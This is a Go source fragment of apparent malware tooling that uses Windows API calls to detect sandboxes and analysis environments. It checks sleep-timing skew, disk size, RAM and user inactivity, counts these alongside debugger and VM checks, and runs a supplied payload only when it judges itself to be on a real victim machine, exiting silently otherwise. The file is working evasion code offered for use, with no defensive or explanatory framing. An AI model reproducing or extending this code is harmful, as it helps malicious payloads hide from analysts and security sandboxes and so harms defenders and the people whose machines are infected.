// Anti-Sandbox: Check for sandbox timing artifacts
func DetectSandboxTiming() bool {
	procGetTickCount := kernel32.NewProc("GetTickCount")

	// Sleep for a short time and check if actual time passed
	start, _, _ := procGetTickCount.Call()

	procSleep := kernel32.NewProc("Sleep")
	procSleep.Call(500) // Sleep 500ms

	end, _, _ := procGetTickCount.Call()
	elapsed := uint32(end - start)

	// If elapsed time is significantly different, we're in a sandbox
	// Sandboxes often skip sleep to speed up analysis
	return elapsed < 450 || elapsed > 550
}

// Check for low disk space (sandboxes often have small disks)
func CheckDiskSpace() bool {
	procGetDiskFreeSpaceEx := kernel32.NewProc("GetDiskFreeSpaceExW")

	var freeBytesAvailable, totalNumberOfBytes, totalNumberOfFreeBytes uint64

	ret, _, _ := procGetDiskFreeSpaceEx.Call(
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("C:\\"))),
		uintptr(unsafe.Pointer(&freeBytesAvailable)),
		uintptr(unsafe.Pointer(&totalNumberOfBytes)),
		uintptr(unsafe.Pointer(&totalNumberOfFreeBytes)),
	)

	if ret == 0 {
		return false
	}

	// Sandboxes typically have < 60GB total disk space
	totalGB := totalNumberOfBytes / (1024 * 1024 * 1024)
	return totalGB < 60
}

// Check for minimum RAM (sandboxes often have < 4GB)
func CheckRAM() bool {
	type MEMORYSTATUSEX struct {
		Length               uint32
		MemoryLoad           uint32
		TotalPhys            uint64
		AvailPhys            uint64
		TotalPageFile        uint64
		AvailPageFile        uint64
		TotalVirtual         uint64
		AvailVirtual         uint64
		AvailExtendedVirtual uint64
	}

	procGlobalMemoryStatusEx := kernel32.NewProc("GlobalMemoryStatusEx")

	var memStatus MEMORYSTATUSEX
	memStatus.Length = uint32(unsafe.Sizeof(memStatus))

	ret, _, _ := procGlobalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&memStatus)))

	if ret == 0 {
		return false
	}

	// Check if RAM is less than 4GB (typical sandbox)
	totalGB := memStatus.TotalPhys / (1024 * 1024 * 1024)
	return totalGB < 4
}

// Check for user interaction (sandboxes have no real user)
func CheckUserActivity() bool {
	procGetLastInputInfo := user32.NewProc("GetLastInputInfo")

	type LASTINPUTINFO struct {
		Size uint32
		Time uint32
	}

	var lastInput LASTINPUTINFO
	lastInput.Size = uint32(unsafe.Sizeof(lastInput))

	ret, _, _ := procGetLastInputInfo.Call(uintptr(unsafe.Pointer(&lastInput)))

	if ret == 0 {
		return false
	}

	// If no input in last 2 minutes, likely sandbox
	procGetTickCount := kernel32.NewProc("GetTickCount")
	currentTick, _, _ := procGetTickCount.Call()
	timeSinceInput := (uint32(currentTick) - lastInput.Time) / 1000 // Convert to seconds

	return timeSinceInput > 120
}

// Comprehensive evasion check combining all methods
func RunVXAPIChecks() bool {
	checks := []struct {
		name string
		fn   func() bool
	}{
		{"IsDebuggerPresent", IsDebuggerPresent},
		{"CheckRemoteDebugger", CheckRemoteDebuggerPresent},
		{"CheckHardwareBreakpoints", CheckHardwareBreakpoints},
		{"IsVirtualMachine", IsVirtualMachine},
		{"DetectSandboxTiming", DetectSandboxTiming},
		{"CheckDiskSpace", CheckDiskSpace},
		{"CheckRAM", CheckRAM},
		{"CheckUserActivity", CheckUserActivity},
	}

	suspiciousCount := 0

	for _, check := range checks {
		if check.fn() {
			suspiciousCount++
		}
	}

	// If 3 or more checks fail, we're in analysis environment
	return suspiciousCount >= 3
}

// Execute payload with anti-analysis guards
func ExecuteWithVXAPI(payload func()) {
	// Run all VX-API checks
	if RunVXAPIChecks() {
		// Exit silently if in analysis environment
		return
	}

	// Execute payload
	payload()
}
